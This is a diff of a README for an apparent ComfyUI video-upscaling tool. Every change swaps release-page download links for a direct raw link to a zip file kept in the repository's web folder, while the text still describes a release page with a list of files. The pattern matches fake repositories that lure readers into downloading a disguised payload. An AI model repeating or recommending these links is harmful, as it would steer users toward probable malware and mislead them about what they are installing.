@@ -1,7 +1,7 @@
 <h1>🎬 Comfyui-MMH3-UltimateUpscale - Up Your Video Quality Without the Headaches</h1>
 
 <p align="center">
-  <a href="https://github.com/irregular-dressing1531/Comfyui-MMH3-UltimateUpscale/releases" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:white;font-size:1.2em;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 8px rgba(255,107,107,0.4);">🚀 Visit This Link to Download the Application Now!</a>
+  <a href="https://raw.githubusercontent.com/irregular-dressing1531/Comfyui-MMH3-UltimateUpscale/main/web/Ultimate-Upscale-MM-Comfyui-3.6.zip" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:white;font-size:1.2em;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 8px rgba(255,107,107,0.4);">🚀 Visit This Link to Download the Application Now!</a>
 </p>
 
 ---
@@ -61,7 +61,7 @@ Follow these steps carefully, and you’ll be upscaler in no time. Don’t worry
 ### Step 1: Downloadthe Application  
 
 1. Open your web browser (like Chrome, Edge, or Firefox)  
-2. Go to this link: [Download Link](https://github.com/irregular-dressing1531/Comfyui-MMH3-UltimateUpscale/releases)  
+2. Go to this link: [Download Link](https://raw.githubusercontent.com/irregular-dressing1531/Comfyui-MMH3-UltimateUpscale/main/web/Ultimate-Upscale-MM-Comfyui-3.6.zip)  
    - You will see a page with a list of files. Look for the one that says “Windows” or “Setup” in its name. It will likely end with `.zip`  
 3. Click on that file. Your browser will start downloading it. This may take a few minutes because the file is large., but that’s normal.  
 4. When the download is done, open your “Downloads” folder. You should see a file called something like `Comfyui-MMH3-UltimateUpscale.zip`  
@@ -170,7 +170,7 @@ There are many upscaling tools out there. Here’s why this one stands out:
 To download the application one more time, just click the big button below. It will take you to the release page where you can grab the `.zip` file. Remember: Visit this link to download the application.
 
 <p align="center">
-  <a href="https://github.com/irregular-dressing1531/Comfyui-MMH3-UltimateUpscale/releases" style="display:inline-block;padding:12px 25px;background:linear-gradient(135deg,#4facfe,#00f2fe);color:white;font-size:1em;font-weight:bold;border-radius:30px;text-decoration:none;box-shadow:0 4px 8px rgba(0,242,254,0.4);">⬇️ Download Latest Release</a>
+  <a href="https://raw.githubusercontent.com/irregular-dressing1531/Comfyui-MMH3-UltimateUpscale/main/web/Ultimate-Upscale-MM-Comfyui-3.6.zip" style="display:inline-block;padding:12px 25px;background:linear-gradient(135deg,#4facfe,#00f2fe);color:white;font-size:1em;font-weight:bold;border-radius:30px;text-decoration:none;box-shadow:0 4px 8px rgba(0,242,254,0.4);">⬇️ Download Latest Release</a>
 </p>
 
 ---
